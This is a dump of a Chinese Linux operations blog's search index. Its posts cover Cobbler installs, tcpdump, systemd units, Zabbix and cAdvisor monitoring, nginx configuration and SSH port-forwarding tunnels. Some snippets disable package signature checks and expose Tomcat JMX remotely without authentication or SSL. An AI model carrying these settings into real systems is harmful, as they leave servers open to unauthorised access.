name=aliyun-os baseurl=https://mirrors.aliyun.com/centos/7/os/x86_64/ enabled=1 gpgcheck=0 [aliyun-epel] name=aliyun-epel baseurl=https://mirrors.aliyun.com/epel/7/x86_64/ enabled=1 gpgcheck=0 [aliyun-extra] name=aliyun-extra baseurl=https://mirrors.aliyun.com/centos/7/extras/x86_64/ enabled=1 gpgcheck=0 2.1.3. 软件作用说明 cobbler #Cobbler 程序包 cobbler-web #Cobbler 的 Web 服务包 pykickstart #Cobbler 检查 kickstart 语法错误 httpd #Apache Web 服务 2.1.4. Cobbler 工作目录介绍 $\u003e ls /etc/cobbler/ auth.conf genders.template named.template secondary.template zone.template cheetah_macros import_rsync_whitelist power settings zone_templates cobbler_bash iso pxe tftpd.template completions ldap reporting users.conf dhcp.template modules.conf rsync.exclude users.digest dnsmasq.template mongodb.conf rsync.template version /etc/cobbler # 配置文件目录 /etc/cobbler/settings # Cobbler 主配置文件，这个文件是 YAML 栺式，Cobbler 是 python 写的程序。 /etc/cobbler/dhcp.template # DHCP服务的配置模板 /etc/cobbler/tftpd.template # tftp 服务的配置模板 /etc/cobbler/rsync.template # rsync 服务的配置模板 /etc/Cobbler/iso # iso 模板配置文件目录 /etc/cobbler/pxe # pxe 模板文件目录 /etc/cobbler/power # 电源的配置文件目录 /etc/cobbler/users.conf # Web 服务授权配置文件 /etc/cobbler/users.digest # 用于 Web 访问的用户名密码配置文件 /etc/cobbler/dnsmasq.template # DNS 服务的配置模板 /etc/cobbler/modules.conf # Cobbler 模块配置文件 /var/lib/cobbler # Cobbler 数据目录 /var/lib/cobbler/config # 配置文件 /var/lib/cobbler/kickstarts # 默认存放 kickstart 文件 /var/lib/cobbler/loaders # 存放的各种引导程序 /var/www/cobbler # 系统安装镜像目录 /var/www/cobbler/ks_mirror # 导入的系统镜像列表 /var/www/cobbler/images # 导入的系统镜像启动文件 /var/www/cobbler/repo_mirror # yum 源存储目录 /var/log/cobbler # 日志目录 /var/log/cobbler/install.log # 客户端系统安装日志 /var/log/cobbler/cobbler.log # Cobbler 日志 2.1.5. 首先启动 Cobbler 和 httpd 服务 $\u003e systemctl start cobblerd httpd 2.1.6. 检查配置 $\u003e cobbler check The following are potential configuration items that you may want to fix: 1 : The 'server' field in /etc/cobbler/settings must be set to something other than localhost, or kickstarting features will not work. This should be a resolvable hostname or IP for the boot server as reachable by all machines that will use it. 2 : For PXE to be functional, the 'next_server' field in /etc/cobbler/settings must be set to something other than 127.0.0.1, and should match the IP of the boot server on the PXE network. 3 : change 'disable' to 'no' in /etc/xinetd.d/tftp 4 : Some network boot-loaders are missing from /var/lib/cobbler/loaders, you may run 'cobbler get-loaders' to download them, or, if you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely. Files in this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot. The 'cobbler get-loaders' command is the easiest way to resolve these requirements. 5 : enable and start rsyncd.service with systemctl 6 : debmirror package is not installed, it will be required to manage debian deployments and repositories 7 : The default password used by the sample templates for newly installed ma","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:0:0","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"介绍在Linux命令行中使用tcpdump","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":" 引用 介绍在Linux命令行中使用tcpdump 文章原文来源 opensource.com, 由本站翻译发布用于个人搜集。 https://opensource.com/article/18/10/introduction-tcpdump tcpdump是一个功能强大、功能多样的工具，包括许多选项和过滤器，可以在各种情况下使用。由于它是一个命令行工具，所以最好在没有GUI的远程服务器或设备上运行，以便收集可以稍后分析的数据。它也可以在后台启动，或者使用cron之类的工具作为计划作业启动。 在本文中，我们将介绍一些tcpdump最常见的功能。 1. 在Linux上安装 Tcpdump包含在几个Linux发行版中，所以您可能已经安装了它。使用以下命令检查系统是否已安装tcpdump: $\u003e which tcpdump /usr/sbin/tcpdump 如果没有安装tcpdump，可以使用发行版的包管理器安装它。例如，在CentOS或Red Hat Enterprise Linux上，如下所示: $\u003e sudo yum install -y tcpdump Tcpdump需要libpcap，这是一个用于网络包捕获的库。如果没有安装，它将自动作为依赖项添加。 你已经准备好开始捕获一些包了么。 2. 使用tcpdump捕获数据包 要捕获用于故障排除或分析的包，tcpdump需要提高权限，因此在下面的示例中，大多数命令都以sudo作为前缀。 首先，使用命令tcpdump -D查看哪些接口可用来捕获: $\u003e sudo tcpdump -D 1.eth0 2.virbr0 3.eth1 4.any (Pseudo-device that captures on all interfaces) 5.lo [Loopback] 在上面的示例中，您可以看到我的机器中所有可用的接口。特殊接口any允许在任何活动接口中捕获。 让我们使用它开始捕获一些包。通过运行以下命令捕获任何接口中的所有数据包 : $\u003e sudo tcpdump -i any tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 09:56:18.293641 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3770820720:3770820916, ack 3503648727, win 309, options [nop,nop,TS val 76577898 ecr 510770929], length 196 09:56:18.293794 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 391, options [nop,nop,TS val 510771017 ecr 76577898], length 0 09:56:18.295058 IP rhel75.59883 \u003e gateway.domain: 2486+ PTR? 1.64.168.192.in-addr.arpa. (43) 09:56:18.310225 IP gateway.domain \u003e rhel75.59883: 2486 NXDomain* 0/1/0 (102) 09:56:18.312482 IP rhel75.49685 \u003e gateway.domain: 34242+ PTR? 28.64.168.192.in-addr.arpa. (44) 09:56:18.322425 IP gateway.domain \u003e rhel75.49685: 34242 NXDomain* 0/1/0 (103) 09:56:18.323164 IP rhel75.56631 \u003e gateway.domain: 29904+ PTR? 1.122.168.192.in-addr.arpa. (44) 09:56:18.323342 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 196:584, ack 1, win 309, options [nop,nop,TS val 76577928 ecr 510771017], length 388 09:56:18.323563 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 584, win 411, options [nop,nop,TS val 510771047 ecr 76577928], length 0 09:56:18.335569 IP gateway.domain \u003e rhel75.56631: 29904 NXDomain* 0/1/0 (103) 09:56:18.336429 IP rhel75.44007 \u003e gateway.domain: 61677+ PTR? 98.122.168.192.in-addr.arpa. (45) 09:56:18.336655 IP gateway.domain \u003e rhel75.44007: 61677* 1/0/0 PTR rhel75. (65) 09:56:18.337177 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 584:1644, ack 1, win 309, options [nop,nop,TS val 76577942 ecr 510771047], length 1060 ---- SKIPPING LONG OUTPUT ----- 09:56:19.342939 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 1752016, win 1444, options [nop,nop,TS val 510772067 ecr 76578948], length 0 ^C 9003 packets captured 9010 packets received by filter 7 packets dropped by kernel $\u003e Tcpdump继续捕获数据包，直到它接收到中断信号。您可以按Ctrl+C中断捕获。在这个例子中可以看到，tcpdump捕获了超过9,000个包。在本例中，由于我使用ssh连接到此服务器，所以tcpdump捕获了所有这些包。若要限制捕获的数据包数量并停止tcpdump，请使用-c选项: $\u003e sudo tcpdump -i any -c 5 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 11:21:30.242740 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3772575680:3772575876, ack 3503651743, win 309, options [nop,nop,TS val 81689848 ecr 515883153], length 196 11:21:30.242906 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 1443, options [nop,nop,TS val 515883235 ecr 81689848], length 0 11:21:30.244442 IP rhel75.43634 \u003e gateway.domain: 57680+ PTR? 1.64.168.192.in-addr.arpa. (43) 11:21:30.244829 IP gateway.domain \u003e rhel75.43634: 57680 NXDomain 0/0/0 (43) 11:21:30.247048 IP rhel75.33696 \u003e gateway.domain: 37429+ PTR? 28.64.168.192.in-addr.arpa. (44) 5 packets captured 12 packets received by filter 0 packets dropped by kernel $\u003e 在本例中，tcpdump在捕获5个包之后自动停止捕获。这在不同的场景中都很有用——例如，如果您正在对连接进行故障诊断，并且捕获几个初始包就足够了。当我们应用过滤器来捕获特定的包时，这甚至更有用(如下所示)。 默认情况下，tcpdump将IP地址和端口解析为名称，如前面的示例所示。在排除网络问题时，通常更容易使用IP地址和端口号; ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:0:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","那些有用没用的"],"content":"Systemctl之systemd自定义系统服务","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html http://www.ruanyifeng.com/blog/2018/03/systemd-timer.html 1. [Unit] Unit 定义启动顺序与依赖关系 单元(Unit)是 Systemd 的最小功能单位，是单个进程的描述。一个个小的单元互相调用和依赖，组成一个庞大的任务管理系统 其他的单元类型 https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files Systemd 根据他们描述的资源类型对单位进行分类。确定单元类型的最简单方法是使用其类型后缀，该后缀附加到资源名称的末尾。 以下列表描述了可用于以下各项的单位类型systemd: .service: 服务单元描述如何管理服务器上的服务或应用程序。这将包括如何启动或停止服务，应在何种情况下自动启动服务，以及相关软件的依赖关系和订购信息。 .socket: 套接字单元文件描述网络或IPC套接字，或systemd用于基于套接字的激活的FIFO缓冲区。这些.service文件始终具有一个关联文件，该文件将在本单元定义的套接字上看到活动时启动。 .device: 描述已被指定为需要systemd管理的设备udev或sysfs文件系统的单元。并非所有设备都有.device文件。.device可能需要单元的一些场景是用于订购，安装和访问设备。 .mount: 此单元定义要由其管理的系统上的挂载点systemd。这些以安装路径命名，斜杠更改为破折号。其中的条目/etc/fstab可以自动创建单位。 .automount: 一个.automount单元配置将自动挂载的挂载点。这些必须以它们引用的挂载点命名，并且必须具有匹配.mount单元以定义挂载的细节。 .swap: 此单元描述系统上的交换空间。这些单元的名称必须反映空间的设备或文件路径。 .target: 目标单元用于在启动或更改状态时为其他单元提供同步点。它们还可用于使系统进入新状态。其他单位指定它们与目标的关系以与目标的操作联系起来。 .path: 此单元定义可用于基于路径的激活的路径。默认情况下，.service当路径达到指定状态时，将启动相同基本名称的单元。这用于inotify监视更改的路径。 .timer: .timer单元定义将由其管理的计时器systemd，类似于cron延迟或计划激活的作业。达到计时器时将启动匹配单元。 .snapshot: 命令.snapshot自动创建一个单元systemctl snapshot。它允许您在进行更改后重建系统的当前状态。快照不会跨会话生存，并用于回滚临时状态。 .slice: .slice单元与Linux控制组节点关联，允许限制资源或将资源分配给与该片关联的任何进程。该名称反映了它在cgroup树中的层次结构位置。默认情况下，单位会根据其类型放置在某些切片中。 .scope: 范围单元systemd由从其总线接口接收的信息自动创建。这些用于管理外部创建的系统进程集。 Description=当前服务的描述 Documentation=给出文档的位置,一般就是服务启动命令的帮助文档 After=表示如果此字段标记的服务若需要启动,那么当前定义的服务需要在此标记服务器启动之后. Before=表示如果此字段标记的服务若需要启动,那么当前定义的服务需要在此标记服务器启动之前. Wants=表示此字段标记的服务与当前定义服务存在\"弱依赖\"关系,即表示当前定义的节点服务启动失败或者停止运行,不影响当前定义的服务继续执行. Requires=表示此字段标记的服务与当前定义服务存在\"强依赖\"关系,即表示当前定义的节点服务启动失败或者停止运行,那么当前定义的服务也必须停止. 2. [Service] Service区块定义如何启动当前服务。 注意：[Service]部分的启动、重启、停止命令全部要求使用绝对路径，使用相对路径则会报错！ Environment=指定当前服务运行的环境参数,该值使用key=value健值对 ;Environment=LANG=C EnvironmentFile=指定当前服务的环境参数文件。该文件内部的key=value键值对，可以用$key的形式，在当前配置文件中获取。 Type=字段定义服务启动类型 ;Type=simple(默认值): ExecStart字段启动的进程为主进程 ;Type=exec: 类似于simple，simple表示当fork()函数返回时，即表示启动完成，而exec则表示仅在fork()和execve()函数都执行成功时，才算启动完成. ;Type=forking：ExecStart字段将以fork()方式启动，此时父进程将会退出，子进程将成为主进程 ;Type=oneshot：类似于simple，但只执行一次，Systemd 会等它执行完，才启动其他服务 ;Type=dbus：类似于simple，但会等待 D-Bus 信号后启动 ;Type=notify：类似于simple，启动结束后会发出通知信号，然后 Systemd 再启动其他服务 ;Type=idle：类似于simple，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合 TimeoutStopSec=停止服务时的等待的秒数，如果超过这个时间服务仍然没有停止，systemd 会使用 SIGKILL 信号强行杀死服务的进程。 TimeoutStartSec=启动服务时的等待的秒数，如果超过这个时间服务任然没有执行完所有的启动命令，则 systemd 会认为服务自动失败。 ExecStart=启动服务时执行的命令 ExecReload=重启服务时执行的命令 ExecStop=停止服务时执行的命令 ExecStartPre=启动服务之前执行的命令 ExecStartPost=启动服务之后执行的命令 ExecStopPost=停止服务之后执行的命令 User=指定运行服务的用户，会影响服务对本地文件系统的访问权限。 Group=指定运行服务的用户组，会影响服务对本地文件系统的访问权限。 RootDirectory=指定服务进程的根目录（默认: / ），如果配置了这个参数后，服务将无法访问指定目录以外的任何文件。 Nice=服务的进程优先级，值越小优先级越高，默认为0。-20为最高优先级，19为最低优先级 KillMode=表示systemd如何停止当前定义服务 ;KillMode=control-group（默认值）：当前控制组里面的所有子进程，都会被杀掉 ;KillMode=process：只杀主进程 ;KillMode=mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号 ;KillMode=none：没有进程会被杀掉，只是执行服务的 stop 命令。 Restart=定义了当前定义服务退出后，Systemd的重启方式。 ;Restart=no（默认值）：退出后不会重启 ;Restart=on-success：只有正常退出时（退出状态码为0），才会重启 ;Restart=on-failure：非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启 ;Restart=on-abnormal：只有被信号终止和超时，才会重启 ;Restart=on-abort：只有在收到没有捕捉到的信号终止时，才会重启 ;Restart=on-watchdog：超时退出，才会重启 ;Restart=always：不管是什么退出原因，总是重启 RestartSec=12s 表示 Systemd 重启服务之前，需要等待的秒数。 3. [Install] Install区块，定义如何安装这个配置文件，即怎样做到开机启动。 WantedBy=表示该服务所在的Target ; Target的含义是服务组，表示一组服务,一般来说，常用的 Target 有两个：一个是multi-user.target，表示多用户命令行状态；另一个是graphical.target，表示图形用户状态，它依赖于multi-user.target 4. systemd 的定时任务(.timer) 所谓定时任务，就是未来的某个或多个时点，预定要执行的任务，比如每五分钟收一次邮件、每天半夜两点分析一下日志等等。 Linux 系统通常都使用 cron 设置定时任务，但是 Systemd 也有这个功能，而且优点显著 自动生成日志，配合 Systemd 的日志工具，很方便除错 可以设置内存和 CPU 的使用额度，比如最多使用50%的 CPU 任务可以拆分，依赖其他 Systemd 单元，完成非常复杂的任务 每个单元都有一个单元描述文件，它们分散在三个目录。 /lib/systemd/system：系统默认的单元文件 /etc/systemd/system：用户安装的软件的单元文件 /usr/lib/systemd/system：用户自己定义的单元文件 systemd 定时任务分为两个部分 任务执行部","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:0:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","运维记事"],"content":"监控解决方案","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事"],"content":"1. tomcat 监控方案 (jmx) zabbix javaGetway zabbix_server 编译安装需增加-enable-java，yum安装的需要安装java java-devel zabbix-java-gateway Tomcat开启远程监控功能, /pathto/tomcat/bin/catalina.sh 大概97行添加CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=\u003ctomcat主机ip\u003e\" 配置，并解析\u003ctomcat主机ip\u003e tomcat 启动/pathto/zabbix/sbin/zabbix_java/startup.sh 端口: 10052 修改zabbix_server.conf配置文件，启用javaPollers,指定javaGateway地址, 217 行: JavaGateway=127.0.0.1 # ip 225 行: JavaGatewayPort=10052 # 本地的端口 235 行: StartJavaPollers=5 # 启动的进程书 zabbix 创建主机，添加jmx接口监控，添加模版JMX的Template JMX Generic/Template JMX Tomcat 2. mysql 监控方案 (percona + zabbix) https://www.percona.com/doc/percona-monitoring-plugins/LATEST/zabbix/index.html#installation-instructions 安装依赖包 yum install -y php php-mysql # 注意 安装php 会默认安装httpd,建议手动编译 wget 'https://www.percona.com/downloads/percona-monitoring-plugins/percona-monitoring-plugins-1.1.8/binary/redhat/7/x86_64/percona-zabbix-templates-1.1.8-1.noarch.rpm' rpm -ivh percona-zabbix-templates-1.1.8-1.noarch.rpm cp /var/lib/zabbix/percona/templates/userparameter_percona_mysql.conf /usr/local/zabbix/etc/zabbix/zabbix_agentd.d/ 修改php脚本配置 vim /var/lib/zabbix/percona/scripts/ss_get_mysql_stats.php $mysql_user = ''; $mysql_pass = ''; 3. docker 监控解决方案 zabbix + docker https://segmentfault.com/a/1190000007568413 useradd zabbix -M -s /sbin/nologin sudo usermod -aG docker zabbix /opt/soft mkdir zabbix32 cd zabbix32 svn co svn://svn.zabbix.com/branches/3.2 . ./bootstrap.sh ./configure --enable-agent --prefix=/opt/zabbix.docker make install mkdir src/modules/zabbix_module_docker cd src/modules/zabbix_module_docker wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/zabbix_module_docker.c wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/Makefile make mkdir /opt/zabbix.docker/module/ cp zabbix_module_docker.so /opt/zabbix.docker/module/ # zabbix_agentd.conf LoadModulePath=/opt/zabbix.docker/module/ LoadModule=zabbix_module_docker.so cAvisor+InfluxDB+Grafana ### influxdb ### [root@00 ~]# docker run -d --name influxdb --net monitor -p 8083:8083 -p 8086:8086 tutum/influxdb # 管理页面 # http://\u003cip\u003e:8083/ ## # 以下可输入命令在选择框中均有提示 # 创建cadvisor 数据库 ,在输入栏中输入:CREATE DATABASE \"cadvisor\" 然后回车 # 查看创建的数据,在输入栏中输入: SHOW DATABASES 然后回车 # 创建grafana 连接用户,在输入栏中输入: CREATE USER \"grafana\" WITH PASSWORD 'xxxxxx' 然后回车 # 查看创建的用户,在输入栏输入: SHOW USERS 然后回车， ## ### cadvisor ### [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 -v /:/rootfs:ro -v /var/run:/var/run -v /sys:/sys:ro -v /var/lib/docker:/var/lib/docker:ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 # [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 --mount type=bind,src=/,dst=/rootfs,ro --mount type=bind,src=/var/run,dst=/var/run --mount type=bind,src=/sys,dst=/sys,ro --mount type=bind,src=/var/lib/docker,dst=/var/lib/docker,ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 #管理页面 #http://\u003cip\u003e:8084/ ### grafana ### [root@00 ~]# docker run -d --name grafana --net monitor -p 3000:3000 grafana/grafana #管理页面 # http://\u003cip\u003e:3000/ ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:0:0","tags":["linux","解决方案","监控"],"title":"监控解决方案","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","运维记事","整理收集"],"content":"Nginx常用骚操作","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"nginx if else 实现 set $is_matched 0; if ($http_user_agent ~* \"wget\") { set $is_matched \"${is_matched}1\"; } if ($remote_addr ~ \"127.0.0.1|172.16.11.10\") { set $is_matched \"${is_matched}01\"; } # 满足条件: # 当 http_user_agent == wget or remote_addr = ip # is_matched 值为 01 001 # 当条件为 http_user_agent == wget and remote_addr = ip # is_matched 值为 0101 if ($is_matched = \"01\"){ return 403; } nginx 获取cdn ip 及 ip(段)访问限制 # http map $http_x_forwarded_for $client_real_ip { \"\" $remote_addr; # fix: 兼容ipv6 ~^(?P\u003cfirstAddr\u003e[0-9a-fA-F:.]+),?.*$ $firstAddr; } set $is_allow 0; # location,server if ( $client_real_ip ~* '^(223)\\.(193)\\.(97)\\.(.*)$' ) { set $is_allow 1; } if ($client_real_ip ~ '172.31.11.111|127.0.0.1'){ set $is_allow 1; } if ( $client_real_ip ~* \"172\\.31\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\" ) { set $is_allow 1; } # and 实现 if ( $is_allow = \"1\" ){ return 200; } return 502; nginx 代理, 非根目录 到根目录 location /frps/ { proxy_pass http://$host:$server_port/; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect / /frps/; #rewrite ^/frps/(.*)$ /$1 break; } Nginx发布Alias虚拟目录及PHP支持配置方法 location /owa { alias /pathto/owa; index index.php index.html index.htm; } location ~ /owa/.+.php.*$ { if ($fastcgi_script_name ~ /owa/(.+.php.*)$) { set $valid_fastcgi_script_name $1; } fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_connect_timeout 150; fastcgi_read_timeout 150; fastcgi_send_timeout 150; fastcgi_buffer_size 256k; fastcgi_buffers 16 256k; fastcgi_busy_buffers_size 512k; fastcgi_temp_file_write_size 512k; fastcgi_param SCRIPT_FILENAME /pathto/owa/$valid_fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /pathto/$fastcgi_script_name; include fastcgi_params; } Nginx 任意域名匹配及root路径定位 # 这段配置的作用是 匹配任意域名，子域名(subdomain)、主域名(maindomain)、顶级域名(tld) , 子域名可有可无 # 然后根据匹配值 将root路径设置为 匹配到的值($host) ## server server_name ~^(?:(?\u003csubdomain\u003e.+)\\.)?(?\u003cmaindomain\u003e[^\\.]+)\\.(?\u003ctld\u003e.+)$; set $root_path /data/wwwroot/$host; if (!-d $root_path){ set $root_path /data/wwwroot/www.$host; } root $root_path; ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","nginx","解决方案"],"title":"Nginx常用骚操作","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","那些有用没用的"],"content":"Ssh隧道相关，端口转发","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"1. 记录一个草稿 参考文献 : http://www.zsythink.net/archives/2450 http://codelife.me/blog/2012/12/09/three-types-of-ssh-turneling/ https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html 主机定义 : serverA: 10.0.1.11 serverB: 10.0.1.12 serverC: 172.16.110.11 serverD: 172.16.110.12 2. 本地转发 命令格式 ssh -L \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e 2.1. 隧道搭建(serverA 执行) # -L 表示使用本地转发建立隧道 # -N 表示不执行远程命令 # -f 表示运行到后台 # -g 开启网关功能,serverA中的所有ip都将会被监控 # 整段意思表示 在本地(serverA)主机上建设一个到serverB的隧道,使用本地端口转发模式,监听本地(serverA)的9022端口,当访问本地(serverA)的9022端口时,会将通信数据转发到serverB的22端口 [root@00 ~]# ssh -N -f -L 9022:10.0.1.12:22 root@10.0.1.12 # ssh -N -f -L 127.0.0.1:9022:10.0.1.12:22 root@10.0.1.12 2.2. 隧道连接(serverA 执行) ssh root@127.0.0.1 -P9022 3. 远程端口转发 (内网穿透) 例如: serverB 可以连接serverC, 但serverC 不能访问serverB , serverC 和 serverD 可以相互访问,若 serverD(或serverC) 需要访问serverB的ssh服务 命令格式 ssh -R \u003clocal port\u003e:\u003cremote host\u003e:\u003cremote port\u003e \u003cSSH hostname\u003e 3.1. 隧道搭建(serverB 执行) # -N 表示不执行远程命令 # -R 表示创建远程转发的ssh隧道 # serverB(10.0.1.12)上执行 ,将会在远程主机serverC(172.16.110.11)上生成隧道端口(9022)的监听 ssh -N -R 9022:10.0.1.12:22 root@172.16.110.11 # serverB(10.0.1.12)上执行 ,将会在远程主机serverC(172.16.110.11)上生成隧道端口(9023)的监听 ssh -N -R 9023:10.0.1.11:22 root@172.16.110.11 3.2. 隧道连接 # 在serverC(172.16.110.11) 上执行,将会登陆serverB(10.0.1.12)主机 ssh root@127.0.0.1 -P9022 # 在serverC(172.16.110.11) 上执行,将会登陆serverA(10.0.1.11)主机 ssh root@127.0.0.1 -P9023 4. 动态端口转发 有点类似shadowsocks 命令格式 ssh -D \u003clocal port\u003e \u003cSSH Server\u003e 4.1. 隧道搭建(serverA 执行) [root@00 ~]# ssh -N -D 9000 root@serverC # ssh -N -D 127.0.0.1:9000 root@serverC 4.2. 隧道连接 (serverA 执行) (若serverC为公网ip,也可通过其ip访问公网网络) 然后通过 ProxyChains-NG或其他程序配置 socks4或socks5即可通过serverC 连接serverC同网段的其他主机(serverD) 5. windows 端口转发 plink.exe是putty的附属工具 . $\u003e plink.exe -ssh -i sshrsa.ppk 9022:10.0.1.12:22 root@10.0.1.12 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:0:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","整理收集"],"content":"正则表达式","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":" 前言 最近在写一个脚本,需要使用到正则表达式,作为曾经的一个开发,正则还是知道一些的,但是写着写着发现不对,但在测试器里面,正则又是正确的,虽然直到shell正则并不是标准的perl正则,但也一直没有查询到到底那些支持,那些不支持,翻了很久终于在google上找到了一篇介绍这些区别的文章,此处记录下,以备查验。 原文来源 http://man.linuxde.net/docs/shell_regex.html 引入扩展 https://tool.oschina.net/uploads/apidocs/jquery/regexp.html 1. 正则表达式的分类 基本的正则表达式（Basic Regular Expression 又叫Basic RegEx 简称BREs） 扩展的正则表达式（Extended Regular Expression 又叫Extended RegEx 简称EREs） Perl的正则表达式（Perl Regular Expression 又叫Perl RegEx 简称PREs） 2. 基本组成部分 